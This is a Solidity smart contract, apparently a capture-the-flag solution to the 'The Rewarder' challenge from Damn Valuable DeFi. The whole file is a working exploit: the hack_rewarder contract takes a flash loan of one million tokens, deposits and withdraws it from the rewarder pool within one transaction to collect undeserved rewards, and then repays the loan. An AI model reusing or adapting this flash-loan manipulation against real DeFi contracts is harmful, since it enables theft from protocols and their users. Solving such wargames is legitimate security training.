//SPDX-License Identifier: MIT
pragma solidity ^0.8.0;

import "./AccountingToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";

contract hack_rewarder {
    FlashLoanerPool private immutable flashloan;
    TheRewarderPool private immutable rewarderpool;
    address private immutable hacker;
    DamnValuableToken private immutable dvt;
    AccountingToken private immutable acc;
    uint256 private constant amount = 1000000 ether;

    constructor(
        address _flashloan,
        address _rewarderpool,
        address _dvt,
        address _acc
    ) {
        flashloan = FlashLoanerPool(_flashloan);
        rewarderpool = TheRewarderPool(_rewarderpool);
        dvt = DamnValuableToken(_dvt);
        acc = AccountingToken(_acc);
        hacker = msg.sender;
    }

    function receiveFlashLoan(uint256 amt) public {
        dvt.approve(address(rewarderpool), amt);
        rewarderpool.deposit(amt);
        rewarderpool.withdraw(amt);
        dvt.transfer(address(flashloan), amt);
        //acc.transfer(hacker, acc.balanceOf(address(this)));
    }

    fallback() external {
        receiveFlashLoan(amount);
    }

    receive() external payable {
        receiveFlashLoan(amount);
    }

    function hack() public {
        flashloan.flashLoan(amount);
    }
}
